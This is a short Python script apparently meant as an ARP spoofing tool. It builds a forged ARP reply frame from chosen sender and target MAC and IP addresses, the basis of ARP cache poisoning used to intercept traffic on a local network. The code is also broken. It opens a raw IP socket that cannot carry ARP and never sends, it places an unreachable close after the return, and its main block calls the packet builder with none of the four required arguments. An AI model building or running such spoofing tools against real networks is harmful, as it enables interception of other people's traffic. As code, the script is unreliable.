import socket


class arpspoof():
    def __init__(self) -> None:
        self.arp_type = b'\x08\x06'
        self.oper_request = b'\x00\x01'
        self.oper_answer = b'\x00\x02'

        htype = b'\x00\x01' # Ethernet
        ptype = b'\x08\x00' # IPv4
        hlen = b'\x06'
        plen = b'\x04'

        self.part_of_payload = htype + ptype + hlen + plen
    def make_answer(self, SHA, SPA, THA, TPA):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        packet = THA + SHA + self.arp_type
        packet += self.part_of_payload + self.oper_answer
        packet += SHA + SPA + THA + TPA

        return packet

        sock.close()

if __name__ == "__main__":
    spoof = arpspoof()
    spoof.make_answer()